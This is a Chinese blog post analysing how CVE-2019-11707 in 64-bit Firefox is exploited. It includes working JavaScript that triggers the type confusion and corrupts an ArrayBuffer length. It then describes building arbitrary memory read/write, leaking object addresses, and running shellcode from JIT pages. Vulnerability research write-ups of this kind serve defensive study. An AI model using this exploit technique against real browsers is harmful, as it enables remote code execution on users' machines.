@@ -1,0 +1,65 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="“一个二进制同学的博客。”"><title>x64 11707 | f01965</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/8.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = 'https://hm.baidu.com/hm.js?' + 'true';
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+  })();
+  </script></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">x64 11707</h1><a id="logo" href="/.">f01965</a><p class="description">少年，向前走~~ 别回头。</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">x64 11707</h1><div class="post-meta">Sep 18, 2019<script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> 阅读</span></span></div><a class="disqus-comment-count" href="/2019/09/18/x64-11707/#vcomment"><span class="valine-comment-count" data-xid="/2019/09/18/x64-11707/"></span><span> 条评论</span></a><div class="post-content"><p>CVE-2019-11707  X64上利用分析<br>漏洞成因这里不做讲解，可以参考链接：<a href="https://xz.aliyun.com/t/6054。" target="_blank" rel="noopener">https://xz.aliyun.com/t/6054。</a><br>主要记录利用的过程，要做到完美退出。</p>
+<ol>
+<li>触发漏洞，造成溢出<br>更加样本，修改其中一些部分，然后做到溢出部分修改了某个ArrayBuffer 的byteLength。<br>给出样本代码：</li>
+</ol>
+<p>let buf = [];<br>for(var i = 0 ; i &lt; 4 ;i++)<br>{<br>    buf[i] = new ArrayBuffer(0x20);<br>}<br>var OOb_Object = buf[0];<br>var ChangeObject_Index = 0;<br>let buf_uint8 = new Uint8Array(OOb_Object);<br>let y = new Uint32Array(OOb_Object);<br>const v4 = [y, y, y, y, y];<br>function v7(v31) {<br>    if (v4.length == 0) {<br>        v4[3] = y;<br>    }<br>    const v11 = v4.pop();<br>    v11[18] = 0xa0;<br>    for (let v15 = 0; v15 &lt; 10000; v15++) {}<br>}<br>var p = {};<br>p = [buf_uint8, y, y];<br>v4.<strong>proto</strong> = p;</p>
+<p>for (let v31 = 0; v31 &lt; 2000; v31++) {<br>    v7(v31);<br>}<br>for(var i = 0 ; i &lt; 10 ; i++)<br>{<br>    var len = buf[i].byteLength;<br>    if( len != 0x20)<br>    {<br>        ChangeObject_Index = i;<br>        break;<br>    }<br>}<br>上面的过程，将触发漏洞修改到 buf[1] 的byteLength 部分。从原来的 0x20 修改为 0xa0。<br>这样就获得一个溢出的ArrayBuffer 对象，如下图。<br> <img src="0.png" alt=""><br>注意申请的ArrayBuffer在内存的布局，它们是连续的。<br>另外，使用windbg 进行调试的时候，内存十分庞大，用常规的 s –d 等指令搜索会很慢很慢。<br>这里建议使用 !address 命令，然后找到类似如下图的内存，这些内存就是一些零散的堆块，用来存放申请的对象等数据。<br>然后在某一个buf 设置一些特殊值，比如：0x67890001<br> <img src="1.png" alt=""></p>
+<p>使用 Notepad++ 的列编辑功能，把上图的地址直接一列抓出来<br> <img src="2.png" alt=""><br>复制到下面这样的位置，然后复制全部的命令，粘贴到windbg ，进行搜索。<br><img src="3.png" alt=""></p>
+<p>如下图，这样搜索起来，快很多。</p>
+<p><img src="4.png" alt=""></p>
+<ol start="2">
+<li>利用溢出的ArrayBuffer<br>使用长度被该为0xa0的ArrayBuffer ，修改到下一个ArrayBuffer的长度，改为0x90400，这就是一个非常长的ArrayBuffer对象。方便后面做 任意地址读写了。<br>为什么要用0xa0 的ArrayBuffer来做到这一步，为什么不在漏洞触发的时候，就把0xa0的长度写长一些呢？</li>
+</ol>
+<p>这是因为，漏洞触发的时候，混淆的对象是 Uint8Array 与 Uint32Array，Uint8Array 对象每次只能写入一个Byte。所以修改的数据最大也只能是0xFF。</p>
+<p>那么为什么用Uint8Array 与 Uint32Array来进行混淆呢，而不用其他的。下面简单说明一下，具体参考文章中说讲部分<a href="https://xz.aliyun.com/t/6054" target="_blank" rel="noopener">https://xz.aliyun.com/t/6054</a><br>先区分一下，Firefox 64位与32位的不同。<br>(1)    在64 位的Firefox中，用一个Qword 来表示数据与tag部分。这tag 就是数据的标志位，js 语言中任何变量都可以看成是一个对象，如何区分他们，就用这个tag标志位。<br>比如在Firefox 67.0.2 -x64 的环境下:<br> 0xfffe003f13370012  =  tag + 数据<br>tag = 0xfffe0  表面后面的数据是一个对象；0x03f13370012 就是这个对象的地址。<br>标志位在不同的版本可能不同。<br>由此可以看出 tag 和数据部分是紧密联系的。，</p>
+<p>(2)    32位的Firefox中，tag 用一个Dword 表示，数据用一个Dword 表示。<br>比如Firefox 67.0.2  x86 环境下：<br>0x12003400  0xffffff81<br>0xffffff81 就是tag 表示前面的数据是一个整数。<br>0x12003400   就是整数值。<br>数据与tag 是分开的。</p>
+<p>现在，来利用漏洞。<br>32位下就可以用 Uint32Array 与 ArrayBuffer 进行混淆，因为ArrayBuffer 的任意一个值被修改，不会影响tag位，因为漏洞触发只修改一个Dword，而tag 与数据是分开存放的。</p>
+<p>64位下，Uint32Array 与 ArrayBuffer 进行混淆，只修改一个Dword ( 因为目前JS对象只有Uint32Array ，没有Uint64Array ) 而一个Qword 中的数据部分，不一定只存放在一个Dword中，只修一个Dword 的大小是错误的。<br>这里只是为了方便说明，具体情况动手去分析就明白了。</p>
+<ol start="3">
+<li>任意地址读写<br>前面，已经有了一个byteLength 为0x90400的ArrayBuffer 。将这个ArrayBuffer初始化，可以初始化化为 Uint8Array，也可以是DataView ，或者Uint32Array。<br>下面来分析ArrayBuffer在内存中的布局情况(64位与32位是不同的)。<br>先看如下图：<br><img src="5.png" alt=""></li>
+</ol>
+<p>下面对照上图进行说明：<br>00000290<code>390070a0 000001af04c10040          Group_ 结构
+00000290</code>390070a8 00000290390085b0         Shape_ 结构<br>00000290<code>390070b0 0000000000000000         Slot_ 结构
+00000290</code>390070b8 000007fee27b1d28  xul!mozilla_dump_image+0x22ea9b8 Element_ 结构<br>00000290<code>390070c0 000001481c803870         数据区域指针，使用时要左移一位
+00000290</code>390070c8 fff8800000000020         数据区域大小，byteLength<br>00000290<code>390070d0 fffe01af04c171c0         指向第一个视图的指针
+00000290</code>390070d8 fff8800000000000         flag 位<br>00000290<code>390070e0 0000000000000000         数据部分
+00000290</code>390070e8 0000000000000000<br>00000290<code>390070f0 0000000000000000 
+00000290</code>390070f8 0000000000000000</p>
+<p>64位中特别的一点就是 ArrayBuffer 的数据指针是右移一位存放的，使用的时候需要左移一位。这里的数据指针就是： 0x000001481c803870  左移一位 –&gt; 0x00000290`390070e0<br> <img src="6.png" alt=""></p>
+<p>做任意地址读写的时候，也需要把要读写的地址，右移一位，放到这个位置去。然后，进行再次进行初始化，就能使用初始化的对象，对这个地址进行读写了。再次进行初始化非常很关键，不要忘记了。<br>将地址移位的函数很简单，但是，要注意左移和右移的时候，如果地址没有对其，就会存在丢位。即基数地址右移就丢了1位，需要另外补齐丢失的。</p>
+<p>另外注意的一点，如果初始化为 Uint32Array 进行地址读写的，读取的时候，因为是一个Dword进行读，假如要读取的地址是： 0x00FF123400FF56789 ，那么第一次高8位读取 00FF56789 ，但是 00 会被丢弃，读出的数据是 FF56789 ；第二次低8位读取00FF1234 ，00也被丢弃，读取FF1234。那么，把读取的数据当字符串进行拼接： “FF1234”+ “FF56789” = FF1234FF56789 ，与原地址00FF123400FF56789 不同的是缺少了高8位中丢弃的00。所以用Uint32Array进行读取需要补0。同样，使用Uint8Array 也存在这样的问题，00 会被当做 0 ，也就缺少了一个0。</p>
+<p>再次说明：读写地址的时候，先把地址右移一位，然后放到ArrayBuffer的buffer指针位置，<br>通过 0xa0 这个ArrayBuffer 对0x90400的ArrayBuffer的buffer指针进行操作。然后初始化。</p>
+<ol start="4">
+<li>任意对象泄露<br>任意对象的泄露，是方便后续劫持函数，构造fake Class_ 等数据结构的时候，有地方存放，而不是随便放到内存某个位置。</li>
+</ol>
+<p>任意对象泄露，是通过Array数组来实现。</p>
+<p>在申请ArrayBuffer的时候，紧接着申请一个Array，这个Array分配空间不能太长，太长就会分配到其他位置去。刚刚合适就好，它就会申请在 ArrayBuffer 附近，然后赋特殊值。<br>myArray[0] = 0x12273447;<br>myArray[1] = [];<br>内存中的情况，如下图：<br> <img src="7.png" alt=""><br>myArray[0] 存放特殊值，用0x90400的ArrayBuffer 进行寻找。找到之后，取出特殊值后面一个Qword ，也就是myArray[1] 。myArray[1] 就可以用来存放任何对象，这样就能泄露任意对象的地址了。</p>
+<ol start="5">
+<li>最后<br>现在有了任意地址泄露，任意对象泄露，剩下的操作就是劫持对象的函数指针，泄露jit 的指针，构造假的对象，调用劫持的对象。<br>这一部分，最终情况是：执行到jit 页面，jit页面放着我们的shellcode ，这个shellcode的作用是调用VirtualProtect，把能弹cmd窗口的shellcode位置变为可执行的空间，然后跳进去执行，并且执行完之后，能退回程序自己的流程，Firefox不会崩溃。<br>如下图，图中的shellcode我写的是0x90，0x CCCCCCCC13371337，是用来寻找这个jit地址。</li>
+</ol>
+<p><img src="8.png" alt=""></p>
+</div><iframe src="/donate/?AliPayQR=null&amp;WeChatQR=/img/weChat.png&amp;GitHub=null&amp;BTCQR=null&amp;BTCKEY=null&amp;PayPal=null" style="overflow-x:hidden; overflow-y:hidden; border:0xp none #fff; min-height:240px; width:100%;" frameborder="0" scrolling="no"></iframe><div class="tags"><a href="/tags/漏洞利用/">漏洞利用</a></div><div class="post-nav"><a class="next" href="/2019/08/15/又一个起点/">又一个起点</a></div><div id="vcomment"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'o3qEIvAEzJfA0jPzjvyVeUwo-gzGzoHsz',
+  appKey:'VBV3VN2vtqwbGqHGFeNL86iw',
+  placeholder:'thanks for you read',
+  avatar:'mm',
+  guest_info:guest_info,
+  pageSize:'10'
+})</script></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" target="_blank"><input type="search" name="word" maxlength="20" placeholder="Search"/><input type="hidden" name="si" value="https://f01965.github.io"/><input name="tn" type="hidden" value="bds"/><input name="cl" type="hidden" value="3"/><input name="ct" type="hidden" value="2097152"/><input name="s" type="hidden" value="on"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CVE-2018/">CVE / 2018</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/技术分享/">技术分享</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/日志/">日志</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/随笔/" style="font-size: 15px;">随笔</a> <a href="/tags/机器学习框架/" style="font-size: 15px;">机器学习框架</a> <a href="/tags/GC/" style="font-size: 15px;">GC</a> <a href="/tags/Mircosoft/" style="font-size: 15px;">Mircosoft</a> <a href="/tags/fuzz/" style="font-size: 15px;">fuzz</a> <a href="/tags/漏洞利用/" style="font-size: 15px;">漏洞利用</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/09/18/x64-11707/">x64 11707</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/15/又一个起点/">又一个起点</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/24/No-successful-fuzz/">No successful fuzz</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/02/2019,新的开始/">2019,新的开始</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/27/最近的情况/">最近的情况</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/13/This-Black-October/">This Black October</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/14/ohh-we-got/">ohh,we got</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/07/freefree/">freefree</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/30/GC-algorithm/">GC algorithm</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/29/What-have-I-done-recently/">What have I done recently?</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="https://yan-1-20.github.io/about/" title="Asprose" target="_blank">Asprose</a><ul></ul><a href="https://www.lucifaer.com/" title="Lucifaer" target="_blank">Lucifaer</a><ul></ul><a href="http://drac0nids.top/" title="Drac0nids" target="_blank">Drac0nids</a><ul></ul><a href="http://balis0ng.com/" title="balis0ng" target="_blank">balis0ng</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer"> Dad ， I will always love you.</div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"><script type="text/javascript" color="255,0,0" opacity="0.7" zIndex="-1" count="100" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>
